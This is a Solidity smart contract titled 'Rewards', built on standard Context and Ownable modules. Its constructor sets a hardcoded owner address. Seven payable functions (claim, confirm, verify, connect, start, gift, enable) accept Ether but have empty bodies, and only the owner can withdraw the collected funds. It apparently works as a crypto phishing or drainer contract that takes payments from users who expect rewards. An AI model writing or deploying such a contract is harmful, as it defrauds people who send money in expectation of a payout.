// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby disabling any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract Rewards is Ownable {
    event Withdrawal(address indexed recipient, uint256 amount);

    constructor() {
        // Define o proprietário do contrato no momento da implantação
        transferOwnership(0xfdE93960DEfcc3968e5c0b663cA237272d9F81aF);
    }

    receive() external payable {
        // Implementar lógica para lidar com Ether recebido diretamente pelo contrato
    }

    function withdraw(uint256 amount, address payable recipient) external onlyOwner {
        require(amount > 0, "Amount must be greater than zero");
        require(amount <= address(this).balance, "Requested amount exceeds the contract balance.");
        require(recipient != address(0), "Recipient address cannot be the zero address.");

        // Realiza a transferência do valor para o destinatário
        recipient.transfer(amount);
        emit Withdrawal(recipient, amount);
    }

    function claim() public payable {
        // Implementar lógica para recompensas de claim
    }

    function confirm() public payable {
        // Implementar lógica para recompensas de confirm
    }

    function verify() public payable {
        // Implementar lógica para recompensas de verify
    }

    function connect() public payable {
        // Implementar lógica para recompensas de connect
    }

    function start() public payable {
        // Implementar lógica para recompensas de start
    }

    function gift() public payable {
        // Implementar lógica para recompensas de gift
    }

    function enable() public payable {
        // Implementar lógica para recompensas de enable
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function setNewOwner(address newOwner) public onlyOwner {
        require(newOwner != address(0), "New owner address cannot be the zero address.");
        transferOwnership(newOwner);
    }
}